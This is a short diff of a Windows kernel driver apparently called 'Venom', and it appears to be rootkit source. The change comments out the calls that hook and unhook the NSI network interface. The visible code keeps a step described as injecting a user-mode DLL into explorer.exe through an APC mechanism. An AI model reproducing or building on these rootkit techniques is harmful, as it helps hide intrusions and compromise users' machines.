@@ -44,10 +44,10 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
 
-	status = NetworkHandler::hookNsi();
-	if (!NT_SUCCESS(status)) {
-		return status;
-	}
+	//status = NetworkHandler::hookNsi();
+	//if (!NT_SUCCESS(status)) {
+	//	return status;
+	//}
 
 	// Inject user mode dll to explorer.exe
 	UNICODE_STRING ProcessName = RTL_CONSTANT_STRING(L"explorer.exe");
@@ -110,12 +110,12 @@ void VenomUnload(PDRIVER_OBJECT DriverObject)
 	IoDeleteSymbolicLink(&symLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
 
-	// Unhook NSI.
-	auto status = NetworkHandler::unhookNsi();
-	if (!NT_SUCCESS(status))
-	{
-		DbgPrint("Couldn't unhook NSI");
-	}
+	//// Unhook NSI.
+	//auto status = NetworkHandler::unhookNsi();
+	//if (!NT_SUCCESS(status))
+	//{
+	//	DbgPrint("Couldn't unhook NSI");
+	//}
 
 	::ExWaitForRundownProtectionRelease(&ApcHandler::g_rundown_protection);
 }
